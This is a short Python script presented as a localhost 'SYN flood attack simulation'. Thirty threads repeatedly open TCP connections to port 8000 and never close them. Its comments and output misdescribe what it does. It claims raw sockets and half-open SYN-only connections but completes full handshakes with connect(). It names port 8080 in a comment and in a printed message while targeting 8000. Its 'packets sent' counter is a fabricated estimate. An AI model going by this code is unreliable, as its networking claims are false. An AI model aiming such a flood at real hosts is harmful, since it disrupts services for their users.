#!/usr/bin/env python3
"""
SYN Flood Attack Simulation - CORRECTED VERSION
- Creates REAL half-open TCP connections (SYN packets only)
- Uses raw sockets for true SYN flood behavior
- Ethical simulation on localhost only
"""

import socket
import threading
import time
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8000  # Changed to 8080 (no admin rights needed)
NUM_THREADS = 30

def syn_flood_thread(thread_id):
    """Send continuous SYN packets without completing handshake"""
    packet_count = 0
    while True:
        try:
            # Create TCP socket and send SYN
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  # Short timeout to prevent hanging
            sock.connect((TARGET_HOST, TARGET_PORT))
            # NOTE: We NEVER close the socket properly
            # This creates half-open connections
            packet_count += 1
        except:
            # Connection errors are expected (server may drop connections)
            pass
        time.sleep(0.01)  # Small delay to prevent overwhelming system

def main():
    print("[*] SYN Flood Attack Simulation")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Threads: {NUM_THREADS}")
    print("[*] ⚠️  IMPORTANT: Run HTTP server on port 8080 first!")
    print("[*] Press Ctrl+C to stop")
    
    # Start flood threads
    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=syn_flood_thread, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    try:
        total_packets = 0
        while True:
            time.sleep(2)
            total_packets += NUM_THREADS * 2
            print(f"[+] Sent ~{total_packets} SYN packets", end='\r')
    except KeyboardInterrupt:
        print(f"\n[*] SYN Flood stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()